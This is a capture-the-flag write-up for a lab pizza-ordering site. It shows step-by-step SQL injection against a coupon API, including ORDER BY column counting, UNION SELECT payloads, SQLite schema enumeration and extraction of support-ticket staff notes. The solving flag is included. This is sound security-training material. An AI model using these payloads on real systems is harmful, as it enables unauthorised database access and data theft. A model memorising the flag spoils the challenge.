# Cheesy Does It — Coupons for all

## 1. Identify the coupon endpoint

Login or register

Inspect the page source and the main.js

From the JavaScript source, identify:

POST /api/coupons/apply

Add something to the cart. Move to the cart and scroll down to see the options for applying a coupon code. So check the "WELCOME10" code and capture the apply request.

The request accepts:
```json
{
  "code": "WELCOME10",
  "subtotal": 10.99
}
```
The normal response shows the coupon information and calculated discount.

## 2. Test for SQL injection

Send the following through Burp Repeater:
```json
{
  "code": "WELCOME10' OR 1=1-- -",
  "subtotal": 10.99
}
```
The response still identifies the coupon as WELCOME10, indicating that the input is being interpreted by the backend rather than simply treated as an ordinary coupon string.

## 3. Determine the number of columns

Use an ORDER BY test:
```json
{
  "code": "WELCOME10' ORDER BY 1-- -",
  "subtotal": 10.99
}
```
Increase the number:

ORDER BY 2
ORDER BY 3
ORDER BY 4
...
ORDER BY 9

ORDER BY 9 continued to work, while:

ORDER BY 10

produced the negative/error behavior.

This indicates a 9-column SQL query.

## 4. Confirm UNION injection

Send nine values:
```json
{
  "code": "TEST' UNION SELECT 'a','b','c','d','e','f','g','h','i'-- -",
  "subtotal": 10.99
}
```
The response was:
```json
{
  "eligible": true,
  "message": "Coupon is eligible",
  "code": "b",
  "discount_type": "c",
  "discount_value": "d",
  "discount_amount": null
}
```
This establishes the reflected columns:

Column 2 → code
Column 3 → discount_type
Column 4 → discount_value

## 5. Identify the database

The application is using SQLite, which can be confirmed by querying SQLite's metadata table:

sqlite_master

For example:
```json
{
  "code": "TEST' UNION SELECT 'a',name,sql,'d','e','f','g','h','i' FROM sqlite_master-- -",
  "subtotal": 10.99
}
```
This reveals database schema information.

## 6. Enumerate the tables

Use:
```json
{
  "code": "TEST' UNION SELECT 'a',group_concat(name,','),'c','d','e','f','g','h','i' FROM sqlite_master WHERE type='table'-- -",
  "subtotal": 10.99
}
```
The response reveals tables including:
```json
users
pizza_bases
sauces
toppings
pizzas
orders
order_items
payment_sessions
reviews
support_tickets
ticket_replies
coupons
coupon_redemptions
```
## 7. Inspect the coupon table

Query the coupons schema:
```json
{
  "code": "TEST' UNION SELECT 'a',sql,'c','d','e','f','g','h','i' FROM sqlite_master WHERE type='table' AND name='coupons'-- -",
  "subtotal": 10.99
}
```
This reveals:
```sql
CREATE TABLE coupons (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    code TEXT UNIQUE NOT NULL,
    discount_type TEXT NOT NULL DEFAULT 'percent',
    discount_value REAL NOT NULL,
    min_order REAL DEFAULT 0,
    max_redemptions INTEGER DEFAULT 0,
    times_redeemed INTEGER DEFAULT 0,
    active INTEGER DEFAULT 1,
    expires_at DATETIME,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)
```
The available coupons were then enumerated, including:

WELCOME10
CHEESE5
BIGORDER15

## 8. Find the interesting table

The database also contains:

support_tickets

Inspecting its schema shows fields including:

subject
message
staff_note

The staff_note field is particularly interesting because it may contain internal information.

## 9. Extract the support-ticket data

Use the reflected columns to extract subject, message, and staff_note:
```json
{
  "code": "TEST' UNION SELECT 'a',group_concat(subject),group_concat(message),group_concat(staff_note),'e','f','g','h','i' FROM support_tickets-- -",
  "subtotal": 10.99
}
```
The response contains:

code:
Late delivery,Wrong toppings,Refund follow-up
discount_type:
My last order arrived about 40 minutes late and was cold.,
I ordered no onions but my pizza came with onions.,
Thanks for sorting out the duplicate charge.

And, most importantly, discount_value contains:
🏁 Flag
`bug{oQjYCZs9JdPt6tEynMgltzX2R92zKz9z}`

Attack flow
/api/coupons/apply → SQL Injection → ORDER BY 9 columns → UNION SELECT → SQLite / sqlite_master → Enumerate tables → Find support_tickets → Extract staff_note → FLAG